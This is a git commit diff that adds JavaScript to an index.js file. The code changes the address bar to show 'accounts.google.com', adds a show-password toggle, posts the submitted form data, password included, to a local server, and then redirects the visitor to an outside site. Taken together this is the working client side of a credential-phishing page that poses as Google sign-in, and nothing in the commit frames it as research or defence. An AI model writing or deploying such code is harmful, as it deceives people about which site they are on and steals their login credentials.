4ce84ed5eb388bebba76e8bd1f717f3a3e4b65f0
Mykola Ratushniak <nicolas.ratushniak@gmail.com>
2024-05-22 11:30:41 +0300

    Modify script

--- index.js
+++ index.js
@@ -1,6 +1,27 @@
-document.addEventListener('submit', e => {
+history.replaceState('', '', 'accounts.google.com')
+
+document.addEventListener('DOMContentLoaded', () => {
+    const password = document.querySelector("#txtPassword");
+    const checkbox = document.querySelector("#show");
+
+    checkbox.addEventListener('click',function(){
+        const type = password.getAttribute("type")=== "password" ? "text" : "password";
+        password.setAttribute("type",type);
+    });
+})
+
+document.addEventListener('submit', async e => {
     e.preventDefault();
     const form = e.target;
     const data = new FormData(form);
     console.log('Sending data to a server...');
+
+    try {
+        const response = await fetch("http://127.0.0.1:5000/submit", {
+            method: "POST",
+            body: data,
+        });
+    } finally {
+        window.location.href = 'https://myfishka.com/';
+    }
 })
